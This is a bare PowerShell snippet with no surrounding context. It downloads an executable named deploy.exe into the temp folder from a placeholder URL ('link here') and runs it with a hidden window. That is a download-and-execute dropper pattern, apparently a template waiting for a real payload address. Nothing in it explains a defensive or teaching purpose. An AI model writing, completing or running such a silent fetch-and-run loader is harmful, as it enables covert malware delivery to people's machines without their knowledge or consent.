$tempPath = [System.IO.Path]::GetTempPath()
$exePath = Join-Path $tempPath "deploy.exe"
Invoke-WebRequest -Uri "link here" -OutFile $exePath
Start-Process -FilePath $exePath -WindowStyle Hidden